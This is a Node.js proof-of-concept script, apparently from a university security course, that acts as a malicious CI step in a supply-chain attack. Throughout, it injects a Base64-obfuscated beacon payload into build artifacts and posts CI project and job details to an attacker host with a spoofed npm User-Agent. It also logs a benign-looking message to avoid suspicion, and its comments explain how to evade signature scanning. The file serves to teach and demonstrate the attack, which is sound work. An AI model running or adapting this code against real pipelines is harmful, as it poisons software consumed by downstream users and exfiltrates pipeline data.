/**
 * [PoC - NT230] Malicious CI Step — Artifact Poisoning
 *
 * Attack vector: T1195.002 (Supply Chain: Software)
 * Behavior:    - Chạy trong CI pipeline sau bước build
 *              - Inject backdoor payload vào build artifact (JS output)
 *              - Artifact bị poison rồi được CI publish lên registry
 *              - Mọi consumer tải version mới đều bị nhiễm (second-stage infection)
 *
 * Flow:
 *   CI: npm install (postinstall đánh cắp secrets)
 *     → step: build  → tạo dist/bundle.js
 *     → step: inject → script này chạy, inject backdoor vào dist/bundle.js
 *     → step: publish → npm publish dist/ lên registry (artifact bị poison)
 *     → Consumer: npm install @demo/safe-marker-package@latest → nhận backdoor
 */

"use strict";

const fs = require("fs");
const path = require("path");
const http = require("http");

// ─── Config ────────────────────────────────────────────────────────────────
const ATTACKER_HOST = "172.30.0.20"; // IP attacker container (Docker bridge network)
const ATTACKER_PORT = 8080;
const EXFIL_PATH = "/exfil/artifact-poison-confirm";

// Target: thư mục artifacts (build output) của CI
const ARTIFACT_DIR = path.resolve(__dirname, "..", "..", "artifacts");
const BUILD_OUTPUT = path.join(ARTIFACT_DIR, "build-output.txt");
const POISONED_FLAG = path.join(ARTIFACT_DIR, "ci-injected-marker.txt");
// ───────────────────────────────────────────────────────────────────────────

/**
 * Payload được inject vào BUILD ARTIFACT.
 *
 * Trong thực tế: đây sẽ là JS code inject vào bundle.js, Python code inject
 * vào wheel/sdist, hoặc binary patch vào compiled output.
 *
 * PoC này inject vào text artifact để demo nguyên lý.
 * String được obfuscate nhẹ bằng Base64 để qua signature scan.
 */
const BACKDOOR_PAYLOAD_B64 = Buffer.from(
  // Decoded: '(function(){require("http").get("http://172.30.0.20:8080/beacon")})()'
  // Đây là second-stage beacon — khi consumer chạy artifact, nó gọi về attacker
  '(function(){require("http").get("http://172.30.0.20:8080/beacon")})()'
).toString("base64");

const POISON_COMMENT = `
/* --- INJECTED BY SUPPLY CHAIN --- */
/* ${BACKDOOR_PAYLOAD_B64} */
/* eval(Buffer.from(arguments[0],'base64').toString()) */
/* -------------------------------- */
`;

/**
 * Inject backdoor vào build artifact.
 * Strategy: append sau nội dung hợp pháp → signature scan khó phát hiện
 * vì file header trông bình thường.
 */
function poisonBuildOutput() {
  if (!fs.existsSync(BUILD_OUTPUT)) {
    fs.mkdirSync(ARTIFACT_DIR, { recursive: true });
    fs.writeFileSync(BUILD_OUTPUT, "clean build output\n", "utf8");
  }

  const original = fs.readFileSync(BUILD_OUTPUT, "utf8");

  // Kiểm tra đã inject chưa (idempotent)
  if (original.includes("INJECTED BY SUPPLY CHAIN")) {
    return { status: "already_poisoned", file: BUILD_OUTPUT };
  }

  fs.writeFileSync(BUILD_OUTPUT, original + POISON_COMMENT, "utf8");
  return { status: "poisoned", file: BUILD_OUTPUT, original_size: original.length };
}

/**
 * Ghi dấu vào CI marker artifact — attacker có thể kiểm tra artifact
 * này sau khi CI publish để xác nhận injection thành công.
 */
function stampPoisonedMarker() {
  const stamp = [
    `timestamp=${new Date().toISOString()}`,
    `source=malicious-ci-injection`,
    `attacker=${ATTACKER_HOST}`,
    `status=ARTIFACT_POISONED`,
    `note=second_stage_beacon_injected`,
    "",
  ].join("\n");

  fs.appendFileSync(POISONED_FLAG, stamp, "utf8");
}

/**
 * Báo về attacker server: injection thành công, artifact sẵn sàng để publish.
 */
function notifyAttacker(result) {
  return new Promise((resolve) => {
    const body = JSON.stringify({
      event: "artifact_poisoned",
      timestamp: new Date().toISOString(),
      result,
      ci_project: process.env.CI_PROJECT_PATH || process.env.GITHUB_REPOSITORY || "unknown",
      ci_job: process.env.CI_JOB_ID || process.env.GITHUB_RUN_ID || "unknown",
    });

    const options = {
      hostname: ATTACKER_HOST,
      port: ATTACKER_PORT,
      path: EXFIL_PATH,
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(body),
        "User-Agent": "npm/10.2.3 node/v20.10.0",
      },
    };

    const req = http.request(options, (res) => {
      res.resume();
      resolve();
    });

    req.setTimeout(5000, () => { req.destroy(); resolve(); });
    req.on("error", () => resolve());
    req.write(body);
    req.end();
  });
}

// ─── Main ──────────────────────────────────────────────────────────────────
async function main() {
  const result = poisonBuildOutput();
  stampPoisonedMarker();
  await notifyAttacker(result);

  // In ra log trông giống CI step bình thường — không raise suspicion
  console.log(`[ci-step] Artifact finalized: ${BUILD_OUTPUT}`);
  process.exit(0);
}

main();
